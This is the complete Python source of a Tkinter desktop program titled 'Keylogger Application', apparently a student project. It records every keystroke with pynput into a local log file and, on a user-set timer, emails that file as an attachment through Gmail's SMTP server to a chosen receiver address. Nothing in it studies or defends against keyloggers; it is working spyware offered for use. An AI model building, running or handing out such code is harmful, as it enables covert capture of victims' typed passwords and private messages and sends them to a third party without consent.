from tkinter import *
from pynput.keyboard import Listener
from threading import Thread
import logging
import time
import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import threading


class MyWindow:
    def __init__(self, win):
        self.win = win
        self.win.title('Keylogger Application')
        self.win.geometry("800x500+10+10")
        self.win.configure(bg='black')
        self.win.resizable(False, False)  # Disable window resizing

        self.lbl_heading = Label(
            win,
            text='Keylogger Application',
            font=('Arial', 24, 'bold'),
            bg='black',
            fg='red',
        )
        self.lbl0 = Label(
            win,
            text='Note:  You need to create an App Password on your Google Account as this application doesn’t have “Sign in with Google.”',
            bg='black',
            fg='white',
        )
        self.lbl1 = Label(
            win,
            text='Sender Mail',
            bg='black',
            fg='white',
        )
        self.lbl2 = Label(
            win,
            text='Password',
            bg='black',
            fg='white',
        )
        self.lbl3 = Label(
            win,
            text='Receiver Mail',
            bg='black',
            fg='white',
        )
        self.lbl4 = Label(
            win,
            text='Timer (seconds)',
            bg='black',
            fg='white',
        )
        self.lbl5 = Label(
            win,
            text='Result',
            bg='black',
            fg='white',
        )
        self.lbl6 = Label(
            win,
            text='Made by    ANFAR❤ SABITH❤ HASHIR❤ AKSHAY❤',
            bg='black',
            fg='red',
        )
        self.t1 = Entry(win, bd=3)
        self.t2 = Entry(win, show='*')
        self.t3 = Entry(win)
        self.t4 = Entry(win)
        self.t5 = Text(win, height=5, width=60, bg='black', fg='white')
        self.btn1 = Button(
            win,
            text='Start',
            command=self.start_keylogger,
            bg='red',
            fg='white',
        )
        self.btn2 = Button(
            win,
            text='Stop',
            command=self.stop_keylogger,
            bg='red',
            fg='white',
        )

        self.lbl_heading.place(x=250, y=20)
        self.lbl0.place(x=100, y=70)
        self.lbl1.place(x=100, y=120)
        self.t1.place(x=200, y=120, width=400)
        self.lbl2.place(x=100, y=170)
        self.t2.place(x=200, y=170, width=400)
        self.lbl3.place(x=100, y=220)
        self.t3.place(x=200, y=220, width=400)
        self.lbl4.place(x=100, y=270)
        self.t4.place(x=200, y=270, width=400)
        self.btn1.place(x=200, y=320, width=100)
        self.btn2.place(x=350, y=320, width=100)
        self.lbl5.place(x=100, y=370)
        self.t5.place(x=200, y=370)
        self.lbl6.place(x=100, y=470)

        self.t5.config(state='disabled')  # Disable editing in the text widget

        self.keylogger_active = False  # Flag to indicate if keylogger is active

    def start_keylogger(self):
        if self.keylogger_active:
            # Keylogger is already active
            self.t5.config(state='normal')
            self.t5.insert('end', 'Keylogger is already active\n')
            self.t5.config(state='disabled')
            return

        self.keylogger_active = True
        self.t5.config(state='normal')
        self.t5.delete('1.0', 'end')
        self.t5.insert('end', 'Keylogger started\n')
        self.t5.config(state='disabled')

        def on_press(key):
            logging.info(str(key))

        def keylogger_thread():
            log_dir = ""
            logging.basicConfig(
                filename=(log_dir + "keylogs.txt"),
                level=logging.DEBUG,
                format="%(asctime)s: %(message)s",
            )

            with Listener(on_press=on_press) as ls:
                ls.join()

        def send_mail_thread():
            sender_email = self.t1.get()
            receiver_email = self.t3.get()
            password = self.t2.get()
            interval = int(self.t4.get())
            remaining_time = interval

            while self.keylogger_active:
                time.sleep(1)
                remaining_time -= 1

                if remaining_time <= 0:
                    self.t5.config(state='normal')
                    self.t5.insert('end', 'Sending email...\n')
                    self.t5.config(state='disabled')

                    subject = "An email with keylogs attached"
                    body = "This is an email with attachment from keylogger"

                    message = MIMEMultipart()
                    message["From"] = sender_email
                    message["To"] = receiver_email
                    message["Subject"] = subject
                    message["Bcc"] = receiver_email

                    message.attach(MIMEText(body, "plain"))

                    filename = "keylogs.txt"

                    with open(filename, "rb") as attachment:
                        part = MIMEBase("application", "octet-stream")
                        part.set_payload(attachment.read())

                    encoders.encode_base64(part)
                    part.add_header(
                        "Content-Disposition",
                        f"attachment; filename= {filename}",
                    )
                    message.attach(part)
                    text = message.as_string()

                    context = ssl.create_default_context()
                    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                        server.login(sender_email, password)
                        server.sendmail(sender_email, receiver_email, text)

                    self.t5.config(state='normal')
                    self.t5.insert('end', 'Email Sent\n')
                    self.t5.config(state='disabled')

                    remaining_time = interval

        threading.Thread(target=keylogger_thread).start()
        threading.Thread(target=send_mail_thread).start()

    def stop_keylogger(self):
        if not self.keylogger_active:
            # Keylogger is not active
            self.t5.config(state='normal')
            self.t5.insert('end', 'Keylogger is not active\n')
            self.t5.config(state='disabled')
            return

        self.keylogger_active = False
        self.t5.config(state='normal')
        self.t5.insert('end', 'Keylogger stopped\n')
        self.t5.config(state='disabled')


window = Tk()
mywin = MyWindow(window)
window.mainloop()
